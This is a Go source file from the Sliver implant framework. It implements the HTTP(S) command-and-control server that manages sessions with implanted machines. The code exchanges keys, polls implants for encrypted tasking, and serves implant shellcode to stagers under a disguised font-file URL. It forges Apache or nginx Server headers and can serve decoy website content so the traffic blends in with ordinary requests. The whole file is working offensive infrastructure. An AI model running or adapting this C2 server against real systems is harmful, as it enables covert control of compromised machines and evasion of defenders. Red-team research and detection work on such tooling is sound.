package c2

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"bytes"
	"context"
	"crypto/rand"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/hex"
	"encoding/pem"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	insecureRand "math/rand"
	"net"
	"net/http"
	"net/url"
	"path/filepath"
	"strconv"
	"sync"
	"time"
	"unicode"

	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/bishopfox/sliver/server/certs"
	"github.com/bishopfox/sliver/server/configs"
	"github.com/bishopfox/sliver/server/core"
	"github.com/bishopfox/sliver/server/cryptography"
	sliverHandlers "github.com/bishopfox/sliver/server/handlers"
	"github.com/bishopfox/sliver/server/log"
	"github.com/bishopfox/sliver/server/website"
	"github.com/bishopfox/sliver/util/encoders"

	"github.com/gorilla/mux"
	"google.golang.org/protobuf/proto"
)

var (
	httpLog   = log.NamedLogger("c2", "http")
	accessLog = log.NamedLogger("c2", "http-access")

	ErrMissingNonce   = errors.New("nonce not found in request")
	ErrMissingOTP     = errors.New("otp code not found in request")
	ErrInvalidEncoder = errors.New("invalid request encoder")
	ErrDecodeFailed   = errors.New("failed to decode request")
	ErrReplayAttack   = errors.New("replay attack detected")
)

const (
	DefaultMaxBodyLength   = 2 * 1024 * 1024 * 1024 // 2Gb
	DefaultHTTPTimeout     = time.Minute * 5
	DefaultLongPollTimeout = 20 * time.Second
	DefaultLongPollJitter  = 20 * time.Second
	minPollTimeout         = time.Second * 5
)

var (
	serverVersionHeader string
)

func init() {
	insecureRand.Seed(time.Now().UnixNano())
}

// HTTPSession - Holds data related to a sliver c2 session
type HTTPSession struct {
	ID         string
	ImplanConn *core.ImplantConnection
	Key        cryptography.AESKey
	Started    time.Time
	replay     sync.Map // Sessions are mutex'd
}

// Keeps a hash of each msg in a session to detect replay'd messages
func (s *HTTPSession) isReplayAttack(ciphertext []byte) bool {
	if len(ciphertext) < 1 {
		return false
	}
	sha := sha256.New()
	sha.Write(ciphertext)
	digest := base64.RawStdEncoding.EncodeToString(sha.Sum(nil))
	if _, ok := s.replay.Load(digest); ok {
		return true
	}
	s.replay.Store(digest, true)
	return false
}

// HTTPSessions - All currently open HTTP sessions
type HTTPSessions struct {
	active *map[string]*HTTPSession
	mutex  *sync.RWMutex
}

// Add - Add an HTTP session
func (s *HTTPSessions) Add(session *HTTPSession) {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	(*s.active)[session.ID] = session
}

// Get - Get an HTTP session
func (s *HTTPSessions) Get(sessionID string) *HTTPSession {
	s.mutex.RLock()
	defer s.mutex.RUnlock()
	return (*s.active)[sessionID]
}

// Remove - Remove an HTTP session
func (s *HTTPSessions) Remove(sessionID string) {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	delete((*s.active), sessionID)
}

// HTTPHandler - Path mapped to a handler function
type HTTPHandler func(resp http.ResponseWriter, req *http.Request)

// HTTPServerConfig - Config data for servers
type HTTPServerConfig struct {
	Addr    string
	LPort   uint16
	Domain  string
	Website string
	Secure  bool
	Cert    []byte
	Key     []byte
	ACME    bool

	MaxRequestLength int

	EnforceOTP      bool
	LongPollTimeout int64
	LongPollJitter  int64
}

// SliverHTTPC2 - Holds refs to all the C2 objects
type SliverHTTPC2 struct {
	HTTPServer   *http.Server
	ServerConf   *HTTPServerConfig // Server config (user args)
	HTTPSessions *HTTPSessions
	SliverStage  []byte // Sliver shellcode to serve during staging process
	Cleanup      func()

	c2Config *configs.HTTPC2Config // C2 config (from config file)
}

func (s *SliverHTTPC2) getServerHeader() string {
	if serverVersionHeader == "" {
		switch insecureRand.Intn(1) {
		case 0:
			serverVersionHeader = fmt.Sprintf("Apache/2.4.%d (Unix)", insecureRand.Intn(48))
		default:
			serverVersionHeader = fmt.Sprintf("nginx/1.%d.%d (Ubuntu)", insecureRand.Intn(21), insecureRand.Intn(8))
		}
	}
	return serverVersionHeader
}

func (s *SliverHTTPC2) getCookieName() string {
	cookies := configs.GetHTTPC2Config().ServerConfig.Cookies
	index := insecureRand.Intn(len(cookies))
	return cookies[index]
}

func (s *SliverHTTPC2) LoadC2Config() *configs.HTTPC2Config {
	if s.c2Config != nil {
		return s.c2Config
	}
	s.c2Config = configs.GetHTTPC2Config()
	return s.c2Config
}

// StartHTTPSListener - Start an HTTP(S) listener, this can be used to start both
//						HTTP/HTTPS depending on the caller's conf
// TODO: Better error handling, configurable ACME host/port
func StartHTTPSListener(conf *HTTPServerConfig) (*SliverHTTPC2, error) {
	StartPivotListener()
	httpLog.Infof("Starting https listener on '%s'", conf.Addr)
	server := &SliverHTTPC2{
		ServerConf: conf,
		HTTPSessions: &HTTPSessions{
			active: &map[string]*HTTPSession{},
			mutex:  &sync.RWMutex{},
		},
	}
	server.HTTPServer = &http.Server{
		Addr:         conf.Addr,
		Handler:      server.router(),
		WriteTimeout: DefaultHTTPTimeout,
		ReadTimeout:  DefaultHTTPTimeout,
		IdleTimeout:  DefaultHTTPTimeout,
		TLSNextProto: make(map[string]func(*http.Server, *tls.Conn, http.Handler), 0),
	}
	if conf.ACME {
		conf.Domain = filepath.Base(conf.Domain) // I don't think we need this, but we do it anyways
		httpLog.Infof("Attempting to fetch let's encrypt certificate for '%s' ...", conf.Domain)
		acmeManager := certs.GetACMEManager(conf.Domain)
		acmeHTTPServer := &http.Server{Addr: ":80", Handler: acmeManager.HTTPHandler(nil)}
		go acmeHTTPServer.ListenAndServe()
		server.HTTPServer.TLSConfig = &tls.Config{
			GetCertificate: acmeManager.GetCertificate,
		}
		server.Cleanup = func() {
			ctx, cancelHTTP := context.WithTimeout(context.Background(), 5*time.Second)
			defer cancelHTTP()
			if err := acmeHTTPServer.Shutdown(ctx); err != nil {
				httpLog.Warnf("Failed to shutdown http acme server")
			}
			ctx, cancelHTTPS := context.WithTimeout(context.Background(), 5*time.Second)
			defer cancelHTTPS()
			server.HTTPServer.Shutdown(ctx)
			if err := acmeHTTPServer.Shutdown(ctx); err != nil {
				httpLog.Warn("Failed to shutdown https server")
			}
		}
	} else {
		server.HTTPServer.TLSConfig = getHTTPTLSConfig(conf)
		server.Cleanup = func() {
			ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
			defer cancel()
			server.HTTPServer.Shutdown(ctx)
			if err := server.HTTPServer.Shutdown(ctx); err != nil {
				httpLog.Warn("Failed to shutdown https server")
			}
		}
	}
	_, _, err := certs.C2ServerGetRSACertificate(conf.Domain)
	if err == certs.ErrCertDoesNotExist {
		httpLog.Infof("Generating C2 server certificate ...")
		_, _, err := certs.C2ServerGenerateRSACertificate(conf.Domain)
		if err != nil {
			httpLog.Errorf("Failed to generate server rsa certificate %s", err)
			return nil, err
		}
	}

	return server, nil
}

func getHTTPTLSConfig(conf *HTTPServerConfig) *tls.Config {
	if conf.Cert == nil || conf.Key == nil {
		var err error
		if conf.Domain != "" {
			conf.Cert, conf.Key, err = certs.HTTPSGenerateRSACertificate(conf.Domain)
		} else {
			conf.Cert, conf.Key, err = certs.HTTPSGenerateRSACertificate("localhost")
		}
		if err != nil {
			httpLog.Errorf("Failed to generate self-signed tls cert/key pair %s", err)
			return nil
		}
	}
	cert, err := tls.X509KeyPair(conf.Cert, conf.Key)
	if err != nil {
		httpLog.Errorf("Failed to parse tls cert/key pair %s", err)
		return nil
	}
	return &tls.Config{
		Certificates: []tls.Certificate{cert},
		MinVersion:   tls.VersionTLS12,
	}
}

func (s *SliverHTTPC2) router() *mux.Router {
	router := mux.NewRouter()
	c2Config := s.LoadC2Config()
	if s.ServerConf.MaxRequestLength < 1024 {
		s.ServerConf.MaxRequestLength = DefaultMaxBodyLength
	}
	if s.ServerConf.LongPollTimeout == 0 {
		s.ServerConf.LongPollTimeout = int64(DefaultLongPollTimeout)
		s.ServerConf.LongPollJitter = int64(DefaultLongPollJitter)
	}

	// Key Exchange Handler
	router.HandleFunc(
		fmt.Sprintf("/{rpath:.*\\.%s$}", c2Config.ImplantConfig.KeyExchangeFileExt),
		s.rsaKeyHandler,
	).MatcherFunc(s.filterOTP).MatcherFunc(s.filterNonce).Methods(http.MethodGet)

	// Start Session Handler
	router.HandleFunc(
		fmt.Sprintf("/{rpath:.*\\.%s$}", c2Config.ImplantConfig.StartSessionFileExt),
		s.startSessionHandler,
	).MatcherFunc(s.filterOTP).MatcherFunc(s.filterNonce).Methods(http.MethodGet, http.MethodPost)

	// Session Handler
	router.HandleFunc(
		fmt.Sprintf("/{rpath:.*\\.%s$}", c2Config.ImplantConfig.SessionFileExt),
		s.sessionHandler,
	).MatcherFunc(s.filterNonce).Methods(http.MethodGet, http.MethodPost)

	// Poll Handler
	router.HandleFunc(
		fmt.Sprintf("/{rpath:.*\\.%s$}", c2Config.ImplantConfig.PollFileExt),
		s.pollHandler,
	).MatcherFunc(s.filterNonce).Methods(http.MethodGet)

	// Close Handler
	router.HandleFunc(
		fmt.Sprintf("/{rpath:.*\\.%s$}", c2Config.ImplantConfig.CloseFileExt),
		s.closeHandler,
	).MatcherFunc(s.filterNonce).Methods(http.MethodGet)

	// Can't force the user agent on the stager payload
	// Request from msf stager payload will look like:
	// GET /fonts/Inter-Medium.woff/B64_ENCODED_PAYLOAD_UUID
	router.HandleFunc(
		fmt.Sprintf("/{rpath:.*\\.%s[/]{0,1}.*$}", c2Config.ImplantConfig.StagerFileExt),
		s.stagerHander,
	).MatcherFunc(s.filterOTP).Methods(http.MethodGet)

	// Request does not match the C2 profile so we pass it to the static content or 404 handler
	if s.ServerConf.Website != "" {
		httpLog.Infof("Serving static content from website %v", s.ServerConf.Website)
		router.HandleFunc("/{rpath:.*}", s.websiteContentHandler).Methods(http.MethodGet)
	} else {
		// 404 Handler - Just 404 on every path that doesn't match another handler
		httpLog.Infof("No website content, using wildcard 404 handler")
		router.HandleFunc("/{rpath:.*}", default404Handler).Methods(http.MethodGet, http.MethodPost)
	}

	router.Use(loggingMiddleware)
	router.Use(s.DefaultRespHeaders)

	return router
}

// This filters requests that do not have a valid nonce
func (s *SliverHTTPC2) filterNonce(req *http.Request, rm *mux.RouteMatch) bool {
	nonce, err := getNonceFromURL(req.URL)
	if err != nil {
		httpLog.Warnf("Invalid nonce '%d'", nonce)
		return false // NaN
	}
	return true
}

func (s *SliverHTTPC2) filterOTP(req *http.Request, rm *mux.RouteMatch) bool {
	if s.ServerConf.EnforceOTP {
		httpLog.Debug("Checking for valid OTP code ...")
		otpCode, err := getOTPFromURL(req.URL)
		if err != nil {
			httpLog.Warnf("Failed to validate OTP %s", err)
			return false
		}
		valid, err := cryptography.ValidateTOTP(otpCode)
		if err != nil {
			httpLog.Warnf("Failed to validate OTP %s", err)
			return false
		}
		if valid {
			return true
		}
		return false
	} else {
		httpLog.Debug("OTP enforcement is disabled")
		return true // OTP enforcement is disabled
	}
}

func getNonceFromURL(reqURL *url.URL) (int, error) {
	qNonce := ""
	for arg, values := range reqURL.Query() {
		if len(arg) == 1 {
			qNonce = digitsOnly(values[0])
			break
		}
	}
	if qNonce == "" {
		httpLog.Warn("Nonce not found in request")
		return 0, ErrMissingNonce
	}
	nonce, err := strconv.Atoi(qNonce)
	if err != nil {
		httpLog.Warnf("Invalid nonce, failed to parse '%s'", qNonce)
		return 0, err
	}
	_, _, err = encoders.EncoderFromNonce(nonce)
	if err != nil {
		httpLog.Warnf("Invalid nonce (%s)", err)
		return 0, err
	}
	return nonce, nil
}

func getOTPFromURL(reqURL *url.URL) (string, error) {
	otpCode := ""
	for arg, values := range reqURL.Query() {
		if len(arg) == 2 {
			otpCode = digitsOnly(values[0])
			break
		}
	}
	if otpCode == "" {
		httpLog.Warn("OTP not found in request")
		return "", ErrMissingNonce
	}
	return otpCode, nil
}

func digitsOnly(value string) string {
	var buf bytes.Buffer
	for _, char := range value {
		if unicode.IsDigit(char) {
			buf.WriteRune(char)
		}
	}
	return buf.String()
}

func loggingMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(resp http.ResponseWriter, req *http.Request) {
		accessLog.Infof("%s - %s - %v", getRemoteAddr(req), req.RequestURI, req.Header.Get("User-Agent"))
		next.ServeHTTP(resp, req)
	})
}

// DefaultRespHeaders - Configures default response headers
func (s *SliverHTTPC2) DefaultRespHeaders(next http.Handler) http.Handler {
	return http.HandlerFunc(func(resp http.ResponseWriter, req *http.Request) {
		if s.c2Config.ServerConfig.RandomVersionHeaders {
			resp.Header().Set("Server", s.getServerHeader())
		}
		for _, header := range s.c2Config.ServerConfig.ExtraHeaders {
			resp.Header().Set(header.Name, header.Value)
		}
		next.ServeHTTP(resp, req)
	})
}

func (s *SliverHTTPC2) websiteContentHandler(resp http.ResponseWriter, req *http.Request) {
	httpLog.Infof("Request for site %v -> %s", s.ServerConf.Website, req.RequestURI)
	contentType, content, err := website.GetContent(s.ServerConf.Website, req.RequestURI)
	if err != nil {
		httpLog.Infof("No website content for %s", req.RequestURI)
		default404Handler(resp, req)
		return
	}
	resp.Header().Set("Content-type", contentType)
	resp.Write(content)
}

func default404Handler(resp http.ResponseWriter, req *http.Request) {
	httpLog.Debugf("[404] No match for %s", req.RequestURI)
	resp.WriteHeader(http.StatusNotFound)
}

// [ HTTP Handlers ] ---------------------------------------------------------------

func (s *SliverHTTPC2) rsaKeyHandler(resp http.ResponseWriter, req *http.Request) {
	httpLog.Debug("Public key request")
	nonce, _ := getNonceFromURL(req.URL)
	certPEM, _, err := certs.GetCertificate(certs.C2ServerCA, certs.RSAKey, s.ServerConf.Domain)
	if err != nil {
		httpLog.Infof("Failed to get server certificate for cn = '%s': %s", s.ServerConf.Domain, err)
	}
	_, encoder, err := encoders.EncoderFromNonce(nonce)
	if err != nil {
		httpLog.Infof("Failed to find encoder from nonce %d", nonce)
	}
	resp.Write(encoder.Encode(certPEM))
}

func (s *SliverHTTPC2) startSessionHandler(resp http.ResponseWriter, req *http.Request) {
	httpLog.Debug("Start http session request")

	// Note: these are the c2 certificates NOT the certificates/keys used for SSL/TLS
	publicKeyPEM, privateKeyPEM, err := certs.GetCertificate(certs.C2ServerCA, certs.RSAKey, s.ServerConf.Domain)
	if err != nil {
		httpLog.Warn("Failed to fetch rsa private key")
		default404Handler(resp, req)
		return
	}

	// RSA decrypt request body
	publicKeyBlock, _ := pem.Decode([]byte(publicKeyPEM))
	httpLog.Debugf("RSA Fingerprint: %s", fingerprintSHA256(publicKeyBlock))
	privateKeyBlock, _ := pem.Decode([]byte(privateKeyPEM))
	privateKey, _ := x509.ParsePKCS1PrivateKey(privateKeyBlock.Bytes)

	nonce, _ := getNonceFromURL(req.URL)
	_, encoder, err := encoders.EncoderFromNonce(nonce)
	if err != nil {
		httpLog.Warnf("Request specified an invalid encoder (%d)", nonce)
		default404Handler(resp, req)
		return
	}
	body, err := ioutil.ReadAll(req.Body)
	if err != nil {
		httpLog.Errorf("Failed to read body %s", err)
		default404Handler(resp, req)
	}
	data, err := encoder.Decode(body)
	if err != nil {
		httpLog.Errorf("Failed to decode body %s", err)
		default404Handler(resp, req)
		return
	}

	sessionInitData, err := cryptography.RSADecrypt(data, privateKey)
	if err != nil {
		httpLog.Error("RSA decryption failed")
		default404Handler(resp, req)
		return
	}
	sessionInit := &sliverpb.HTTPSessionInit{}
	proto.Unmarshal(sessionInitData, sessionInit)

	httpSession := newHTTPSession()
	httpSession.Key, _ = cryptography.AESKeyFromBytes(sessionInit.Key)
	httpSession.ImplanConn = core.NewImplantConnection("http(s)", getRemoteAddr(req))
	s.HTTPSessions.Add(httpSession)
	httpLog.Infof("Started new session with http session id: %s", httpSession.ID)

	ciphertext, err := cryptography.GCMEncrypt(httpSession.Key, []byte(httpSession.ID))
	if err != nil {
		httpLog.Info("Failed to encrypt session identifier")
		default404Handler(resp, req)
		return
	}
	http.SetCookie(resp, &http.Cookie{
		Domain:   s.ServerConf.Domain,
		Name:     s.getCookieName(),
		Value:    httpSession.ID,
		Secure:   false,
		HttpOnly: true,
	})
	resp.Write(encoder.Encode(ciphertext))
}

func (s *SliverHTTPC2) sessionHandler(resp http.ResponseWriter, req *http.Request) {
	httpLog.Debug("Session request")
	httpSession := s.getHTTPSession(req)
	if httpSession == nil {
		default404Handler(resp, req)
		return
	}
	httpSession.ImplanConn.UpdateLastMessage()

	plaintext, err := s.readReqBody(httpSession, resp, req)
	if err != nil {
		httpLog.Warnf("Failed to decode request body: %s", err)
		return
	}
	envelope := &sliverpb.Envelope{}
	proto.Unmarshal(plaintext, envelope)

	handlers := sliverHandlers.GetHandlers()
	if envelope.ID != 0 {
		httpSession.ImplanConn.RespMutex.RLock()
		defer httpSession.ImplanConn.RespMutex.RUnlock()
		if resp, ok := httpSession.ImplanConn.Resp[envelope.ID]; ok {
			resp <- envelope
		}
	} else if handler, ok := handlers[envelope.Type]; ok {
		handler(httpSession.ImplanConn, envelope.Data)
	}
	resp.WriteHeader(http.StatusAccepted)
}

func (s *SliverHTTPC2) pollHandler(resp http.ResponseWriter, req *http.Request) {
	httpLog.Debug("Poll request")
	httpSession := s.getHTTPSession(req)
	if httpSession == nil {
		default404Handler(resp, req)
		return
	}
	httpSession.ImplanConn.UpdateLastMessage()

	// We already know we have a valid nonce because of the middleware filter
	nonce, _ := getNonceFromURL(req.URL)
	_, encoder, _ := encoders.EncoderFromNonce(nonce)
	select {
	case envelope := <-httpSession.ImplanConn.Send:
		resp.WriteHeader(http.StatusOK)
		envelopeData, _ := proto.Marshal(envelope)
		ciphertext, err := cryptography.GCMEncrypt(httpSession.Key, envelopeData)
		if err != nil {
			httpLog.Errorf("Failed to encrypt message %s", err)
			ciphertext = []byte{}
		}
		resp.Write(encoder.Encode(ciphertext))
	case <-req.Context().Done():
		httpLog.Debug("Poll client hang up")
		return
	case <-time.After(s.getPollTimeout()):
		httpLog.Debug("Poll time out")
		resp.WriteHeader(http.StatusNoContent)
		resp.Write([]byte{})
	}
}

func (s *SliverHTTPC2) readReqBody(httpSession *HTTPSession, resp http.ResponseWriter, req *http.Request) ([]byte, error) {
	nonce, _ := getNonceFromURL(req.URL)
	_, encoder, err := encoders.EncoderFromNonce(nonce)
	if err != nil {
		httpLog.Warnf("Request specified an invalid encoder (%d)", nonce)
		default404Handler(resp, req)
		return nil, ErrInvalidEncoder
	}

	body, err := ioutil.ReadAll(&io.LimitedReader{
		R: req.Body,
		N: int64(s.ServerConf.MaxRequestLength),
	})
	if err != nil {
		httpLog.Warnf("Failed to read request body %s", err)
		return nil, err
	}

	data, err := encoder.Decode(body)
	if err != nil {
		httpLog.Warnf("Failed to decode body %s", err)
		default404Handler(resp, req)
		return nil, ErrDecodeFailed
	}

	if httpSession.isReplayAttack(data) {
		httpLog.Warn("Replay attack detected")
		default404Handler(resp, req)
		return nil, ErrReplayAttack
	}
	plaintext, err := cryptography.GCMDecrypt(httpSession.Key, data)
	return plaintext, err
}

func (s *SliverHTTPC2) getPollTimeout() time.Duration {
	if s.ServerConf.LongPollJitter < 0 {
		s.ServerConf.LongPollJitter = 0
	}
	min := s.ServerConf.LongPollTimeout
	max := s.ServerConf.LongPollTimeout + s.ServerConf.LongPollJitter
	timeout := float64(min) + insecureRand.Float64()*(float64(max)-float64(min))
	pollTimeout := time.Duration(int64(timeout))
	httpLog.Debugf("Poll timeout: %s", pollTimeout)
	if pollTimeout < minPollTimeout {
		httpLog.Warnf("Poll timeout is too short, using default minimum %v", minPollTimeout)
		pollTimeout = minPollTimeout
	}
	return pollTimeout
}

func (s *SliverHTTPC2) closeHandler(resp http.ResponseWriter, req *http.Request) {
	httpLog.Debug("Close request")
	httpSession := s.getHTTPSession(req)
	if httpSession == nil {
		httpLog.Infof("No session with id %#v", httpSession.ID)
		default404Handler(resp, req)
		return
	}

	_, err := s.readReqBody(httpSession, resp, req)
	if err != nil {
		httpLog.Errorf("Failed to read request body %s", err)
		default404Handler(resp, req)
		return
	}

	s.HTTPSessions.Remove(httpSession.ID)
	resp.WriteHeader(http.StatusAccepted)
}

// stagerHander - Serves the sliver shellcode to the stager requesting it
func (s *SliverHTTPC2) stagerHander(resp http.ResponseWriter, req *http.Request) {
	httpLog.Debug("Stager request")
	if len(s.SliverStage) != 0 {
		httpLog.Infof("Received staging request from %s", getRemoteAddr(req))
		resp.Write(s.SliverStage)
		httpLog.Infof("Serving sliver shellcode (size %d) to %s", len(s.SliverStage), getRemoteAddr(req))
		resp.WriteHeader(http.StatusOK)
	} else {
		resp.WriteHeader(http.StatusNotFound)
	}
}

func (s *SliverHTTPC2) getHTTPSession(req *http.Request) *HTTPSession {
	for _, cookie := range req.Cookies() {
		httpSession := s.HTTPSessions.Get(cookie.Value)
		if httpSession != nil {
			httpSession.ImplanConn.UpdateLastMessage()
			return httpSession
		}
	}
	return nil // No valid cookie names
}

func newHTTPSession() *HTTPSession {
	return &HTTPSession{
		ID:      newHTTPSessionID(),
		Started: time.Now(),
		replay:  sync.Map{},
	}
}

// newHTTPSessionID - Get a 128bit session ID
func newHTTPSessionID() string {
	buf := make([]byte, 16)
	rand.Read(buf)
	return hex.EncodeToString(buf)
}

func getRemoteAddr(req *http.Request) string {
	ipAddress := req.Header.Get("X-Real-Ip")
	if ipAddress == "" {
		ipAddress = req.Header.Get("X-Forwarded-For")
	}
	if ipAddress == "" {
		return req.RemoteAddr
	}

	// Try to parse the header as an IP address, as this is user controllable
	// input we don't want to trust it.
	ip := net.ParseIP(ipAddress)
	if ip == nil {
		httpLog.Warn("Failed to parse X-Header as ip address")
		return req.RemoteAddr
	}
	return fmt.Sprintf("tcp(%s)->%s", req.RemoteAddr, ip.String())
}
